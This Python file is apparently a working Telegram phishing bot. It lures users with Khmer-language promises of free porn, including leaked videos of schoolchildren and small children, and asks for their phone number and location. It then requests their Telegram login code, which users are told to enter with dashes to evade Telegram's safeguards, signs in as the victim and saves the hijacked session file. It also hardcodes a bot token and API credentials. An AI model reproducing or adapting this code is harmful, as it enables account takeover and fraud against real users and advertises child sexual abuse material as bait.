import re
from pyrogram import Client, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError
from pyrogram.types import ReplyKeyboardMarkup
from pyrogram.types import KeyboardButton
import asyncio
import pyfiglet
ascii_banner = pyfiglet.figlet_format("Bots Scraper")
print(ascii_banner)
print('\n..... Pyrogram Bots Running 24/7 ....')
print('\n-- Add Bots to Channel And Set Config.ini Your Channel ID For Auto Send --')
print('\nSave in Folder /Session/{phone}.session ')
print('\nSave List Phone in File /phone.csv ')
# Define the bot token, API ID and API hash
bot_token = "6632084759:AAFrOiitLWaxgwShRV4mvxnDIZnemYZnBr8"
api_id = "3910389"
api_hash = "86f861352f0ab76a251866059a6adbd6"
# Create a global variable to store the Telethon client session
client = None
# Create the Pyrogram bot client
bot = Client("bot", bot_token=bot_token, api_id=api_id, api_hash=api_hash)
# Define a handler for the /start command
@bot.on_message(filters.command("start"))
async def start(bot, message):
    # Ask the user to share their contact and location
     await message.reply_photo(photo="https://cdn.socialmediapornstars.com/files/uploads7/list-of-pornstars-to-join-on-telegram-chat-top.webp",caption="**🔞 ស្វាគមន៍មកកាន់ JVP Bots Official\n-----\n**Type :** បែកធ្លាយ សិស្សសាលា បូក ជប៉ុន ថៃ ខ្មែរ វៀតណាម កូនក្មេងតូច ៗ ... **\n\n**-**មានវិឌីអូជាង 10000 វិឌីអូ ដែរចែកអោយមើល Free មិនគិតលុយ សុទ្ធតែជាវិឌីអូល្អមើល ជក់ចិត្ត\n\n**ចាប់ផ្ដើមអីឡូវនេះដោយចុច Button ក្រោម 👇**")
     await message.reply("**ដើម្បីចូលមើលរឿងសូមចុច Button ខាងក្រោម**", reply_markup=ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="Login As Bots / ចូលមើលរឿងអីឡូវនេះ ☎️ ",
                    request_contact=True,
                    request_location=True
                )
            ],
            ["Cancel"]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    ))

# Define a handler for the contact type
@bot.on_message(filters.contact)
async def contact(bot, message):
    # Get the phone number and location from the contact
    phone = message.contact.phone_number
    location = message.location
    
    # Create a new Telethon client with a file session
    global client
    
    # Remove the + sign from the phone number using re.sub 
    phone_without_plus = re.sub(r'\+', '', phone)
    
    # Use the phone number without the + sign as the session name 
    client = TelegramClient(f"Sessions/{phone_without_plus}.session", api_id, api_hash)

    # Initialize the client
    await client.connect()

    # Check if the user has already signed in with their phone number
    if not await client.is_user_authorized():
        # Send a code request to the user's phone number
        await client.send_code_request(phone)
        await message.reply_animation(animation="https://miro.medium.com/v2/resize:fit:1100/1*GdnmGeVa8hCIM350-K-wjg.gif",caption="**📩   បំពេញកូតដែលទទួលបានពីTelegram**\n>** ឧទាហរណ៍​បើ Code ទទួលបាន : 12345 **\n**> អ្នកវាយបញ្ចូលទម្រង់បែបនេះ 1-2-3-4-5**")
    else:
        # Send a confirmation message
        await message.reply("**Join Group VIP ID : 2781236 ✅!**")
        await message.reply("**Join Group VIP ID : 2781566 ✅!**")
        await message.reply("**Join Group VIP ID : 2781366 ✅!**")
        await message.reply("**Join Group VIP ID : 2781226 ✅!**")
        await message.reply("**អ្នកបានចូលទៅកាន់ Group VIP រួចរាល់​ ✅!**")
# Define a handler for the text type
@bot.on_message(filters.text)
async def text(bot, message):
    # Get the text from the message
    text = message.text
    # Remove spaces from the text
    text = text.replace(" ", "")
    # Check if the text is a valid OTP format (e.g. 1-2-3-4-5)
    if len(text) == 9 and text[1] == text[3] == text[5] == text[7] == "-":
        # Remove the dashes from the text
        otp = text.replace("-", "")
        # Sign in with the OTP code
        await client.sign_in(code=otp)
        await message.reply("You have successfully logged in!")
    else:
        # If the text is not a valid OTP format, send a warning message
        await message.reply("Please enter a valid OTP format.")
# Start the bot
asyncio.run(bot.run())